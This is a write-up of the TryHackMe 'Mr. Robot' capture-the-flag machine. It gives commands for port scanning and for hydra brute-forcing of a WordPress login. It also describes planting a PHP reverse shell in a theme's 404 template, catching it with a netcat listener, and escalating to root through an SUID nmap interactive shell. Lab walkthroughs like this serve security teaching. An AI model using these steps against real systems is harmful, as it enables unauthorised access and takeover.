# 🤖 TryHackMe: Mr. Robot CTF - Write-up

* **Platform:** TryHackMe
* **Machine:** Mr. Robot
* **Category:** Web Exploitation, Brute-forcing, Privilege Escalation

---

## 🎯 Executive Summary
In this CTF, we start with a standard port scan leading us to a web server themed around the Mr. Robot series. By discovering a hidden dictionary file in `robots.txt`, we brute-force our way into the WordPress admin panel. After gaining an initial shell via a malicious 404 template, we escalate our privileges to `root` by exploiting an overly permissive SUID bit on `nmap`.

---

## 🔍 1. Reconnaissance & Enumeration

### Port Scanning
As a best practice in CTF challenges, I always start with a fast all-port scan, followed by a detailed scan on the discovered open ports:

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
nmap -sC -sV -p 22,80,443 <TARGET_IP>

The scan reveals ports 80 (HTTP) and 443 (HTTPS) and 22 (ssh).
Web Enumeration

Navigating to port 80, we see a web terminal simulator mimicking the Mr. Robot environment. It's interactive but doesn't yield useful credentials.

Running directory brute-forcing with gobuster and a common wordlist:
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

This reveals a WordPress login page at /wp-login.php.

Checking the /robots.txt file, we find two interesting entries:

    1- The first flag (key-1-of-3.txt).

    2- A custom wordlist called fsocity.dic.


🔓 2. Gaining Access (Brute-Forcing)

We download the fsocity.dic file.

    💡 Pro Tip: The dictionary is huge and contains many duplicate entries. To save time during brute-forcing, we sort it and remove duplicates:
sort -u fsocity.dic > fsocity_sorted.dic

Username & Password Enumeration using Hydra

We can use wpscan, but hydra is highly effective here.

Finding the Username:
hydra -L fsocity_sorted.dic -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username" -t 30

Note: A faster hacker methodology—if you are familiar with the Mr. Robot show—is to simply guess main characters' names. Testing "Elliot" immediately proves successful!

Finding the Password:
Now that we have the username (elliot), we use the dictionary to crack the password:
hydra -l elliot -P fsocity_sorted.dic <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=The password you entered for the username elliot is incorrect." -t 30
Hydra successfully cracks the password!

💥 3. Initial Foothold (Reverse Shell)

With Elliot's credentials, we log into the WordPress Admin dashboard.

   1- Navigate to Appearance -> Theme Editor.

   2- Select the 404.php (Error template).

   3- Replace its contents with a PHP Reverse Shell script (like pentestmonkey's).

   4- Start a netcat listener on our local Kali machine:
nc -lvnp 4444

5- Navigate to http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php in the browser to trigger the payload.

We catch the shell!

🚀 4. Privilege Escalation

Now inside the machine, we enumerate for vulnerabilities. I checked for SUID binaries using:
find / -perm -4000 -type f 2>/dev/null

Exploiting Nmap SUID

Searching GTFOBins for nmap, we find that older versions of Nmap have an interactive mode that allows executing shell commands. Since it has SUID, the shell will run as root.
nmap --interactive
Once inside the Nmap interactive prompt:
nmap> !sh
(Note: If !sh fails or drops the shell due to environment limitations, using !/bin/bash -p or !/bin/bash works perfectly).

Boom! We have root access and can read the final flag.




